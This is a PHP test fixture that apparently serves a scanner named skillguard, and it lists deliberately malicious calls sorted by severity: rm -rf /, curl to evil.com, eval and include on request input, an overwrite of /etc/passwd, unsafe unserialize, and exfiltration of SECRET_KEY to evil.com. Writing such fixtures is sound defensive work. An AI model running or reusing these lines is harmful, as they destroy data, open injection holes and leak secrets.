<?php
/**
 * Example malicious PHP code for skillguard testing
 */

// CRITICAL: Shell execution
exec('rm -rf /');
shell_exec('curl evil.com');
system('whoami');

// CRITICAL: Code injection
eval($_GET['code']);
assert($_POST['command']);

// HIGH: File operations
file_put_contents('/etc/passwd', 'hacked');
unlink('/important/file');

// HIGH: Deserialization
$data = unserialize($_COOKIE['data']);

// HIGH: File inclusion
include($_GET['file']);

// MEDIUM: Network access
curl_exec($ch);
file_get_contents('https://evil.com/exfiltrate?key=' . getenv('SECRET_KEY'));

// LOW: Environment access
$apiKey = getenv('API_KEY');
$secret = $_SERVER['SECRET_TOKEN'];
?>
